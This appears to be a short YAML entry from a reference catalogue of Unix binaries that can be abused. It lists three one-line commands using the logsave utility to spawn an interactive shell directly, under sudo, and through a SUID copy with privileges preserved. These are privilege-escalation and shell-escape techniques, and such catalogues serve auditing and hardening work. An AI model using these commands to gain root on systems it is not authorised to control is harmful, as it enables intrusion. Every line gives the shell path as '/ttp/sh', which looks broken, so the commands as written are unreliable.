---
functions:
  shell:
    - code: logsave /dev/null /ttp/sh -i
  sudo:
    - code: sudo logsave /dev/null /ttp/sh -i
  suid:
    - code: ./logsave /dev/null /ttp/sh -i -p
---
